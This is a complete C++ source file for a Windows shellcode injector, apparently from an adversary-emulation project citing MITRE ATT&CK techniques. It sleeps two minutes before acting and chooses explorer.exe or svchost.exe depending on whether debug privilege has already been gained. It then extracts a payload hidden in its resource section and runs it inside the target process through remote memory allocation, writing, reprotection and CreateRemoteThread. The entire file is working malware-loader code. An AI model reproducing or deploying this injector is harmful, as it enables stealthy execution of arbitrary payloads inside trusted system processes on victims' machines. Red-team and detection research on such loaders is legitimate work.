#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <cstdio>
#include "resource.h"
#include <chrono>
#include <thread>


// Helper Function to check if the target process has debug permissions
// paramter(s): int pid - the PID of the target process (as seen in process hacker), 
//				PRIVILEGE_SET privs - the unique privilege set (including LUID) for SE_DEBUG
// return(s): bool debug - true if the target process is running with debug permissions, false otherwise
BOOL IsDebug(int pid, PRIVILEGE_SET privs) {
	BOOL debug = false;

	// References: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	// Open the target process w/PROCESS_QUERY_INFORMATION
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
	if (!hProcess) {
		int error = GetLastError();
		std::cerr << "OpenProcess ERROR: " << error << std::endl;
		return debug;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
	// Open the process token w/TOKEN_READ
	HANDLE hToken = NULL;
	OpenProcessToken(hProcess, TOKEN_READ, &hToken);
	if (!hToken) {
		int error = GetLastError();
		std::cerr << "OpenProcessToken ERROR: " << error << std::endl;
		return debug;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-privilegecheck
	// Using the passed in privilege set for SE_DEBUG, check if it's enabled on the token
	bool check = PrivilegeCheck(hToken, &privs, &debug);
	if (!check) {
		int error = GetLastError();
		std::cerr << "PrivilegeCheck ERROR: " << error << std::endl;
		return debug;
	} 

	return debug;
}


// Helper Function to find the target process
// paramter(s): string procname - the name of the target process (as seen in process hacker)
//				PRIVILEGE_SET privs - the unique privilege set (including LUID) for SE_DEBUG
// return(s): int pid - the PID of the named process, or 0 if not found
int FindTarget(const char* procname, PRIVILEGE_SET privs) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	// References: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
	// Take a snapshot of all processes currently running
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	// Check that the snapshot is valid
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// References: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
	//check that processes are accesible
	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
	//			   https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lstrcmpia
	//			   https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid
	// Loop through the snapshot comparing process names until the target process is found
	// When the target process is found save its PID and break
	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			// If the current process is debug but the target is not, keep looking
			// Also check that the target does not have the same PID as the current process
			if (IsDebug(GetCurrentProcessId(), privs) && !IsDebug(pid, privs)) {
				continue;
			} else if(GetCurrentProcessId() == pid) {
				continue;
			} else {
				break;
			}
		}
	}

	CloseHandle(hProcSnap);

	//note that the pid will be of the FIRST matching process name
	return pid;
}


//--------------------------------------------------------------------------------------------MAIN FUNCTION--------------------------------------------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	// UNCOMMENT FOR LOGGING
	// Set error output to go to a log file
	// freopen(R"(C:\Users\Public\injector_log.txt)", "w", stderr);

	std::this_thread::sleep_for(std::chrono::milliseconds(120000));
	//Sleep(120000);

	const char* procname = "explorer.exe";
	int pid = 0;
	LUID se_debug;

	// References: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
	// Look up the unique LUID for the privilege SE_DEBUG_NAME
	bool lookup = LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &se_debug);
	if (!lookup) {
		int error = GetLastError();
		std::cerr << "LookupPrivilegeValue ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}
	// Create a new privilege set requiring only the LUID for SE_DEBUG_NAME
	PRIVILEGE_SET privs{};
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.PrivilegeCount = 1;
	privs.Privilege[0].Luid = se_debug;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Check if the current process has debug permissions
	// This verifies if priv esc has been performed yet, and changes targets accordingly
	if (IsDebug(GetCurrentProcessId(), privs)) {
		procname = "svchost.exe";
	}

	//Find the target process
	pid = FindTarget(procname, privs);
	if (!pid) {
		int error = GetLastError();
		std::cerr << "FindTarget ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	// Opens the target process w/necessary permissions to prepare for injection
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
	if (!hProcess) {
		int error = GetLastError();
		std::cerr << "OpenProcess ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

	// MITRE ATT&CK Techniques:
	//      T1027: Obfuscated Files or Information
	// References: https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew
	// Extract payload from resources section
	// See README for instructions on swapping Resources
	HRSRC res = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RES2_BIN1), L"RES2_BIN");
	if (!res) {
		int error = GetLastError();
		std::cerr << "FindResourceW ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource
	// Load the payload into memory and obtain a Handle to it
	HGLOBAL hResource = LoadResource(NULL, res);
	if (!hResource) {
		int error = GetLastError();
		std::cerr << "LoadResource ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource
	// Convert the HGLOBAL Handle to a pointer -> first byte of payload data
	LPVOID payload = LockResource(hResource);
	if (!payload) {
		int error = GetLastError();
		std::cerr << "LockResource ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	} 

	// References: https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource
	// Get the size (in bytes) of the payload
	DWORD payload_len = SizeofResource(NULL, res);
	if (!payload_len) {
		int error = GetLastError();
		std::cerr << "SizeofResource ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	} 

    // MITRE ATT&CK Techniques:
    //      T1055.001: Process Injection: Dynamic-link Library Injection
	// References: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	// Allocate some memory buffer in the target process for payload
	LPVOID exec_mem = VirtualAllocEx(hProcess, 0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!exec_mem) {
		int error = GetLastError();
		std::cerr << "VirtualAllocEx ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
	// Copy payload to new memory buffer
	DWORD procmem = WriteProcessMemory(hProcess, exec_mem, payload, payload_len, NULL);
	if (!procmem) {
		int error = GetLastError();
		std::cerr << "WriteProcessMemory ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
	// Make the buffer executable
	DWORD oldprotect = 0;
	BOOL vprotect = VirtualProtectEx(hProcess, exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if (!vprotect) {
		int error = GetLastError();
		std::cerr << "VirtualProtectEx ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
	// Launch the payload
	DWORD thread_Id = 0;
	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, &thread_Id);
	if (!hThread) {
		int error = GetLastError();
		std::cerr << "CreateRemoteThread ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

	//Wait for the thread created to return
	WaitForSingleObject(hThread, 1000);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	exit(EXIT_SUCCESS);
}
